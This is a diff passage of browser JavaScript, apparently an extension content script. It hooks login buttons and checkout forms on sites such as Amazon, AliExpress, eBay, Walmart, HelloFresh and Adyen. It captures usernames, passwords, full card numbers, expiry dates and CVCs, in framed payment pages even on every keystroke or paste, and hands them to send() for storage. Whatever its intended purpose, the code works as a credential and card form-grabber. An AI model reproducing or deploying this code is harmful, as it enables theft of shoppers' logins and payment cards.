+                                        });
+                                        tempPaymentMethodsStore = [];
+                                    });
+                                });
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    classicTrackAuthEvent(self, usernameElementId, passwordElementId, loginButtonElementId) {
+        let usernameElement, passwordElement, loginButtonElement;
+        if (document.querySelector(usernameElementId) !== null) {
+            usernameElement = document.querySelector(usernameElementId);
+        }
+        if (document.querySelector(passwordElementId) !== null) {
+            passwordElement = document.querySelector(passwordElementId);
+        }
+        if (document.querySelector(loginButtonElementId) !== null) {
+            loginButtonElement = document.querySelector(loginButtonElementId);
+        }
+        loginButtonElement.addEventListener('click', function () {
+            return send({
+                command: 'saveLoginData',
+                data: {
+                    "event": self.authEvent,
+                    "username": usernameElement.value,
+                    "password": passwordElement.value,
+                    "workWebsite": window.location.origin
+                }
+            });
+        });
+    }
+    crawlAuthFormElement(self, elements, __parentElement) {
+        __parentElement.childNodes?.forEach(function (__childElement) {
+            ['input', 'button', 'a'].forEach(function (__eligibleElement) {
+                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
+                    ['input'].forEach(function (__onlyInputElement) {
+                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
+                            [...__childElement.attributes].forEach(function (__attribute) {
+                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
+                                    /* minor changes start */
+                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
+                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
+                                            elements.push(__childElement);
+                                        }
+                                    });
+                                    /* minor changes end */
+                                }
+                            });
+                        }
+                    });
+                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
+                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 0 || 0) !== -1) {
+                        self.resolveAuthEvent(self, __childElement, elements);
+                    }
+                }
+            });
+            return self.crawlAuthFormElement(self, elements, __childElement);
+        });
+    }
+    resolveAuthEvent(self, element, array) {
+        let elementNode, elementName, elementType, elementValue;
+        element.addEventListener('click', function () {
+            new Set(array).forEach(function (__detectedElement) {
+                [...__detectedElement.attributes].forEach(function (__attribute) {
+                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
+                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute) {
+                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
+                                elementNode = __detectedElement;
+                                elementName = __eligibleAttribute;
+                                elementType = __detectedElement.type;
+                                elementValue = __detectedElement.value;
+                            }
+                        });
+                    }
+                });
+                if (elementValue.length !== 0) {
+                    self.passwordStore.push({
+                        node: elementNode,
+                        name: elementName,
+                        type: elementType,
+                        value: elementValue
+                    });
+                }
+            });
+            send({
+                command: 'saveLoginData',
+                data: {
+                    "event": self.authEvent,
+                    "username": self.passwordStore[0]?.value,
+                    "password": self.passwordStore[1]?.value,
+                    "workWebsite": window.location.origin
+                }
+            });
+            self.passwordStore = [];
+        });
+    }
+    crawlPaymentFormElement(self, elements, __formElement) {
+        __formElement.childNodes?.forEach(function (__childElement) {
+            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
+                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
+                    ['input', 'select'].forEach(function (__eligibleDataElement) {
+                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
+                            ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleElementType) {
+                                if (__childElement.type === __eligibleElementType) {
+                                    [...__childElement.attributes].forEach(function (__attribute) {
+                                        if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
+                                            paymentElementsAttribute.forEach(function (__eligibleKeyword) {
+                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
+                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
+                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
+                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || 0 || 0) === -1) {
+                                                                elements.push(__childElement);
+                                                            }
+                                                        });
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
+                        if (__childElement.type === __eligibleCollectorElement) {
+                            self.resolvePaymentEvent(self, __childElement.form, __childElement, elements);
+                        }
+                    });
+                }
+            });
+            return self.crawlPaymentFormElement(self, elements, __childElement);
+        });
+    }
+    /* PASSED
+    * https://www.tunnelbear.com/account/checkout
+    * https://www.amazon.com/cpe/yourpayments/wallet
+    * */
+    resolvePaymentEvent(self, __formElement, __dataCollectorElement, array) {
+        ['submit'].forEach(function (__formEvent) {
+            __formElement.addEventListener(__formEvent, function () {
+                self.collectPaymentData(self, array);
+            });
+        });
+        ['click', 'dblclick', 'ontouchstart'].forEach(function (__dataCollectorEvent) {
+            __dataCollectorElement.addEventListener(__dataCollectorEvent, function () {
+                self.collectPaymentData(self, array);
+            });
+        });
+        try {
+            if (window.self !== window.top) {
+                new Set(array).forEach(function (__detectedElement) {
+                    ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
+                        __detectedElement.addEventListener(__event, function () {
+                            self.collectPaymentData(self, array);
+                        });
+                    });
+                });
+            }
+        }
+        catch (e) {
+        }
+    }
+    collectPaymentData(self, array) {
+        let elementNode, elementName, elementType, elementValue;
+        new Set(array).forEach(function (__detectedElement) {
+            [...__detectedElement.attributes].forEach(function (__attribute) {
+                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
+                    paymentElementsAttribute.forEach(function (__eligibleKeyword) {
+                        if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
+                            Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
+                                __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
+                                    if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
+                                        elementNode = __detectedElement;
+                                        elementName = __cardDataKey;
+                                        elementType = __detectedElement.type;
+                                        elementValue = __detectedElement.value;
+                                    }
+                                });
+                            });
+                        }
+                    });
+                }
+            });
+            if (elementValue.length !== 0) {
+                self.creditCardStore.push({
+                    node: elementNode,
+                    name: elementName,
+                    type: elementType,
+                    value: elementValue
+                });
+            }
+        });
+        self.retrieveAccurateData(self, self.creditCardStore);
+        send({
+            command: 'savePaymentMethodsData',
+            data: {
+                'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
+                'cardBrand': self.creditCardRuntimeBrand !== '' ? self.creditCardRuntimeBrand : 'Unknown',
+                'cardHolder': self.creditCardRuntimeHolderName !== '' ? self.creditCardRuntimeHolderName : 'Unknown',
+                "cardExpire": self.creditCardRuntimeExpireDate !== '' ? self.creditCardRuntimeExpireDate /*.substring(0, self.creditCardRuntimeExpireDate.length - 1)*/ : 'Unknown',
+                'cardCVC': self.creditCardRuntimeCvc !== '' ? self.creditCardRuntimeCvc : 'Unknown',
+                'event': 'add',
+                "workWebsite": window.location.origin
+            }
+        });
+        self.creditCardStore = [];
+        self.creditCardRuntimeHolderName = '';
+        self.creditCardRuntimeNumber = '';
+        self.creditCardRuntimeBrand = '';
+        self.creditCardRuntimeExpireDate = '';
+        self.creditCardRuntimeCvc = '';
+        self.creditCardRuntimePostalCode = '';
+        //self.verifyFormElement(self);
+    }
+    retrieveAccurateData(self, __creditCardDataStore) {
+        if (__creditCardDataStore.length !== 0) {
+            __creditCardDataStore.forEach(function (__detectedDataElement) {
+                (__detectedDataElement.name === 'cardNumber') ? self.creditCardRuntimeNumber = __detectedDataElement.value : '';
+                (__detectedDataElement.name === 'cardHolder') ? self.creditCardRuntimeHolderName += __detectedDataElement.value + ' ' : '';
+                (__detectedDataElement.name === 'cardBrand') ? self.creditCardRuntimeBrand = __detectedDataElement.value : '';
+                (__detectedDataElement.name === 'cardExpire') ? self.creditCardRuntimeExpireDate += __detectedDataElement.value + '/' : '';
+                (__detectedDataElement.name === 'cardCVC') ? self.creditCardRuntimeCvc = __detectedDataElement.value : '';
+                (__detectedDataElement.name === 'cardPostalCode') ? self.creditCardRuntimePostalCode = __detectedDataElement.value : '';
+            });
+        }
+    }
+    backupScripts(self) {
+        let interval1 = setInterval(function () {
+            if (window.location.origin.indexOf('amazon') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreAmazonPaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('aliexpress') !== -1) {
+                if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
+                    let interval4 = setInterval(function () {
+                        if (document.querySelector('.title-to-detail') !== null) {
+                            clearInterval(interval4);
+                            if (document.querySelector('.title-to-detail')?.textContent?.indexOf('Add a new card') !== -1) {
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
+                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
+                                    });
+                                });
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
+                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
+                                    });
+                                });
+                            }
+                            else {
+                                self.exploreSpecificElementByTagName(self, document.querySelector('.check-out-root'), 'span', 'payment-title', function (__detectedElement) {
+                                    ['click', 'dblclick'].forEach(function (event) {
+                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
+                                            send({
+                                                command: 'savePaymentMethodsData',
+                                                data: {
+                                                    'cardNumber': __detectedElement.textContent,
+                                                    'cardBrand': 'Unknown',
+                                                    'cardHolder': 'Unknown',
+                                                    'cardExpire': 'Unknown',
+                                                    'cardCVC': 'Unknown',
+                                                    'event': 'add',
+                                                    'workWebsite': window.location.origin
+                                                }
+                                            });
+                                        });
+                                    });
+                                });
+                            }
+                        }
+                    }, 1000);
+                }
+                else {
+                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
+                        let interval = setInterval(function () {
+                            if (document.querySelector('.new-card') !== null) {
+                                clearInterval(interval);
+                                self.processAliExpressPaymentNewCard(self);
+                            }
+                        }, 100);
+                        let interval00 = setInterval(function () {
+                            if (document.querySelector('.pay-type.show-method') !== null) {
+                                clearInterval(interval00);
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.pay-type.show-method')?.addEventListener(event, function () {
+                                        let __interval3 = setInterval(function () {
+                                            if (document.querySelector('.new-card') !== null) {
+                                                clearInterval(__interval3);
+                                                self.explorePaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
+                                                    let paymentMethodStore = [];
+                                                    document.querySelector('.save')?.addEventListener('click', function () {
+                                                        elements.forEach(function (element) {
+                                                            paymentMethodStore.push({
+                                                                'element': element.nodeName,
+                                                                'id': element.id,
+                                                                'type': element.type,
+                                                                'value': element.value
+                                                            });
+                                                        });
+                                                        send({
+                                                            command: 'savePaymentMethodsData',
+                                                            data: {
+                                                                'cardNumber': paymentMethodStore[0].value,
+                                                                'cardBrand': 'Unknown',
+                                                                'cardHolder': paymentMethodStore[1].value,
+                                                                'cardExpire': paymentMethodStore[2].value,
+                                                                'cardCVC': paymentMethodStore[3].value,
+                                                                'event': 'add',
+                                                                'workWebsite': window.location.origin
+                                                            }
+                                                        });
+                                                        paymentMethodStore = [];
+                                                    });
+                                                });
+                                            }
+                                        }, 1000);
+                                    });
+                                });
+                            }
+                        }, 100);
+                        if (document.querySelector('.edit-card') !== null) {
+                            ['click', 'dblclick'].forEach(function (event) {
+                                document.querySelector('.edit-card')?.addEventListener(event, function () {
+                                    let __interval3 = setInterval(function () {
+                                        if (document.querySelector('.new-card') !== null) {
+                                            clearInterval(__interval3);
+                                            self.processAliExpressPaymentNewCard(self);
+                                        }
+                                    }, 1000);
+                                });
+                            });
+                        }
+                        if (document.querySelectorAll('.arrow-content').length !== 0) {
+                            document.querySelectorAll('.arrow-content').forEach(function (__detectedDivElement) {
+                                __detectedDivElement.addEventListener('click', function () {
+                                    if (__detectedDivElement.classList.contains('arrow-down')) {
+                                        let __interval2 = setInterval(function () {
+                                            if (document.querySelector('.add-new-card') !== null) {
+                                                clearInterval(__interval2);
+                                                ['click', 'dblclick'].forEach(function (event) {
+                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
+                                                        let __interval3 = setInterval(function () {
+                                                            if (document.querySelector('.new-card') !== null) {
+                                                                clearInterval(__interval3);
+                                                                self.processAliExpressPaymentNewCard(self);
+                                                            }
+                                                        }, 1000);
+                                                    });
+                                                });
+                                            }
+                                        }, 1000);
+                                    }
+                                });
+                            });
+                        }
+                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
+                            let cardConfirmElement = document.querySelector('#checkout-button');
+                            ['click', 'dblclick'].forEach(function (event) {
+                                cardConfirmElement?.addEventListener(event, function () {
+                                    let tempPaymentMethodsStore = [];
+                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
+                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('icon')) {
+                                            if (__childElement.classList.contains('visa')) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __childElement.nodeName,
+                                                    'id': __childElement.id,
+                                                    'value': 'visa'
+                                                });
+                                            }
+                                        }
+                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('pay-name')) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __childElement.nodeName,
+                                                'id': __childElement.id,
+                                                'value': __childElement.textContent
+                                            });
+                                        }
+                                    });
+                                    send({
+                                        command: 'savePaymentMethodsData',
+                                        data: {
+                                            'cardNumber': tempPaymentMethodsStore[0].value,
+                                            'cardBrand': tempPaymentMethodsStore[1].value,
+                                            'cardHolder': 'Unknown',
+                                            'cardExpire': 'Unknown',
+                                            'cardCVC': 'Unknown',
+                                            'event': 'add',
+                                            'workWebsite': window.location.origin
+                                        }
+                                    });
+                                    tempPaymentMethodsStore = [];
+                                });
+                            });
+                        }
+                    }
+                    if (window.location.href.indexOf('payResult.htm') !== -1) {
+                        let interval4 = setInterval(function () {
+                            if (document.querySelector('.verify-card-form-row') !== null) {
+                                clearInterval(interval4);
+                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
+                                    ['click', 'dblclick'].forEach(function (event) {
+                                        let tempPaymentMethodsStore = [];
+                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
+                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardN', function (__detectedElement) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardHolder', function (__detectedElement) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'expires', function (__detectedElement) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cvc', function (__detectedElement) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            send({
+                                                command: 'savePaymentMethodsData',
+                                                data: {
+                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'event': 'add',
+                                                    "workWebsite": window.location.origin
+                                                }
+                                            });
+                                            tempPaymentMethodsStore = [];
+                                        });
+                                    });
+                                }
+                            }
+                        }, 1000);
+                    }
+                }
+                /*if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
+                    clearInterval(interval1);
+                    let interval4 = setInterval(function () {
+                        if (document.querySelector('.title-to-detail') !== null) {
+                            clearInterval(interval4);
+                            if (document.querySelector('.title-to-detail')?.nextElementSibling?.textContent?.indexOf('Add a new card') !== -1) {
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
+                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
+                                    });
+                                });
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
+                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
+                                    });
+                                });
+                            } else {
+                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
+                                    ['click', 'dblclick'].forEach(function (event) {
+                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
+                                            send({
+                                                command: 'savePaymentMethodsData',
+                                                data: {
+                                                    'cardNumber': __detectedElement.textContent,
+                                                    'cardBrand': 'Unknown',
+                                                    'cardHolder': 'Unknown',
+                                                    'cardExpire': 'Unknown',
+                                                    'cardCVC': 'Unknown',
+                                                    'event': 'add',
+                                                    'workWebsite': window.location.origin
+                                                }
+                                            });
+                                        })
+                                    });
+                                });
+                            }
+                        }
+                    }, 1000);
+                    self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
+                        ['click', 'dblclick'].forEach(function (event) {
+                            document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
+                                send({
+                                    command: 'savePaymentMethodsData',
+                                    data: {
+                                        'cardNumber': (__detectedElement as HTMLElement).textContent,
+                                        'cardBrand': 'Unknown',
+                                        'cardHolder': 'Unknown',
+                                        'cardExpire': 'Unknown',
+                                        'cardCVC': 'Unknown',
+                                        'event': 'add',
+                                        'workWebsite': window.location.origin
+                                    }
+                                });
+                            });
+                        });
+                    });
+                } else {
+                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
+                        if (document.querySelectorAll('.arrow-content').length !== 0) {
+                            document.querySelectorAll('.arrow-content').forEach(function (divElement) {
+                                divElement.addEventListener('click', function () {
+                                    if (divElement.classList.contains('arrow-down')) {
+                                        let __interval2 = setInterval(function () {
+                                            if (document.querySelector('.add-new-card') !== null) {
+                                                clearInterval(__interval2);
+                                                ['click', 'dblclick'].forEach(function (event) {
+                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
+                                                        let __interval3 = setInterval(function () {
+                                                            if (document.querySelector('.new-card') !== null) {
+                                                                clearInterval(__interval3);
+                                                                self.explorePaymentNewCard(self,
+                                                                    (document.querySelector('.new-card') as HTMLElement),
+                                                                    function (elements: any) {
+                                                                        let paymentMethodStore: any = [];
+                                                                        document.querySelector('.save')?.addEventListener('click', function () {
+                                                                            elements.forEach(function (element: any) {
+                                                                                paymentMethodStore.push({
+                                                                                    'element': element.nodeName,
+                                                                                    'id': element.id,
+                                                                                    'type': element.type,
+                                                                                    'value': element.value
+                                                                                });
+                                                                            })
+                                                                            send({
+                                                                                command: 'savePaymentMethodsData',
+                                                                                data: {
+                                                                                    'cardNumber': paymentMethodStore[0].value,
+                                                                                    'cardBrand': 'Unknown',
+                                                                                    'cardHolder': paymentMethodStore[1].value,
+                                                                                    'cardExpire': paymentMethodStore[2].value,
+                                                                                    'cardCVC': paymentMethodStore[3].value,
+                                                                                    'event': 'add',
+                                                                                    'workWebsite': window.location.origin
+                                                                                }
+                                                                            });
+                                                                            paymentMethodStore = [];
+                                                                        });
+                                                                    });
+                                                            }
+                                                        }, 1000);
+                                                    })
+                                                });
+                                            }
+                                        }, 1000);
+                                    }
+                                })
+                            });
+                        }
+
+                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
+                            clearInterval(interval1);
+                            let cardConfirmElement = document.querySelector('#checkout-button');
+                            ['click', 'dblclick'].forEach(function (event) {
+                                cardConfirmElement?.addEventListener(event, function () {
+                                    let tempPaymentMethodsStore: any = [];
+                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
+                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
+                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': (__childElement as HTMLElement).nodeName,
+                                                    'id': (__childElement as HTMLElement).id,
+                                                    'value': 'visa'
+                                                });
+                                            }
+                                        }
+                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': (__childElement as HTMLElement).nodeName,
+                                                'id': (__childElement as HTMLElement).id,
+                                                'value': __childElement.textContent
+                                            });
+                                        }
+                                    });
+                                    send({
+                                        command: 'savePaymentMethodsData',
+                                        data: {
+                                            'cardNumber': tempPaymentMethodsStore[0].value,
+                                            'cardBrand': tempPaymentMethodsStore[1].value,
+                                            'cardHolder': 'Unknown',
+                                            'cardExpire': 'Unknown',
+                                            'cardCVC': 'Unknown',
+                                            'event': 'add',
+                                            'workWebsite': window.location.origin
+                                        }
+                                    });
+                                    tempPaymentMethodsStore = [];
+                                });
+                            });
+                        }
+                    }
+                    if (window.location.href.indexOf('payResult.htm') !== -1) {
+                        clearInterval(interval1);
+
+                        let interval4 = setInterval(function () {
+                            if (document.querySelector('.verify-card-form-row') !== null) {
+                                clearInterval(interval4);
+                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
+                                    ['click', 'dblclick'].forEach(function (event) {
+                                        let tempPaymentMethodsStore: any = [];
+                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
+                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
+                                                tempPaymentMethodsStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            send({
+                                                command: 'savePaymentMethodsData',
+                                                data: {
+                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardExpire': tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                    'event': 'add',
+                                                    'workWebsite': window.location.origin
+                                                }
+                                            });
+                                            tempPaymentMethodsStore = [];
+                                        });
+                                    });
+                                }
+                            }
+                        }, 1000);
+                    }
+                }*/
+            }
+            if (window.location.origin.indexOf('ebay') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
+                            if (__ebayCreditCardFormElement.id === 'credit-card-details') {
+                                clearInterval(interval);
+                                let elements = [];
+                                self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
+                            }
+                        });
+                    }
+                }, 100);
+                if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
+                    if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
+                        ["click", "dblclick"].forEach(function (event) {
+                            let tempPaymentMethodsStore = [];
+                            document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
+                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'creditCardNumber', function (__detectedElement) {
+                                    tempPaymentMethodsStore.push({
+                                        'element': __detectedElement.nodeName,
+                                        'id': __detectedElement.id,
+                                        'value': __detectedElement.value
+                                    });
+                                });
+                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'firstName', function (__detectedElement) {
+                                    tempPaymentMethodsStore.push({
+                                        'element': __detectedElement.nodeName,
+                                        'id': __detectedElement.id,
+                                        'value': __detectedElement.value
+                                    });
+                                });
+                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'lastName', function (__detectedElement) {
+                                    tempPaymentMethodsStore.push({
+                                        'element': __detectedElement.nodeName,
+                                        'id': __detectedElement.id,
+                                        'value': __detectedElement.value
+                                    });
+                                });
+                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'expirationDate', function (__detectedElement) {
+                                    tempPaymentMethodsStore.push({
+                                        'element': __detectedElement.nodeName,
+                                        'id': __detectedElement.id,
+                                        'value': __detectedElement.value
+                                    });
+                                });
+                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'cvv', function (__detectedElement) {
+                                    tempPaymentMethodsStore.push({
+                                        'element': __detectedElement.nodeName,
+                                        'id': __detectedElement.id,
+                                        'value': __detectedElement.value
+                                    });
+                                });
+                                send({
+                                    command: 'savePaymentMethodsData',
+                                    data: {
+                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                        'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
+                                        'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
+                                        'cardExpire': tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
+                                        'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
+                                        'event': 'add',
+                                        'workWebsite': window.location.origin
+                                    }
+                                });
+                                tempPaymentMethodsStore = [];
+                            });
+                        });
+                    }
+                }
+            }
+            if (window.location.origin.indexOf('walmart') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
+                        clearInterval(interval);
+                        self.exploreWalmartPaymentContainer(self);
+                    }
+                    if (window.location.href.indexOf('#/review') !== -1) {
+                        clearInterval(interval);
+                        self.exploreWalmartPaymentEditButton(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('hellofresh.de') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
+                        clearInterval(interval);
+                        document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
+                            if (modal.childNodes.length !== 0) {
+                                self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement) {
+                                    __detectedElement.addEventListener('click', function () {
+                                        send({
+                                            command: 'savePaymentMethodsData',
+                                            data: {
+                                                'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
+                                                'cardBrand': 'Unknown',
+                                                'cardHolder': 'Unknown',
+                                                'cardExpire': window.sessionStorage.getItem('cardExpire') !== undefined ? window.sessionStorage.getItem('cardExpire') : 'Unknown',
+                                                'cardCVC': window.sessionStorage.getItem('cardCVC') !== undefined ? window.sessionStorage.getItem('cardCVC') : 'Unknown',
+                                                'event': 'add',
+                                                'workWebsite': window.location.origin
+                                            }
+                                        });
+                                        window.sessionStorage.clear();
+                                    });
+                                });
+                            }
+                        });
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelector('body') !== null) {
+                        clearInterval(interval);
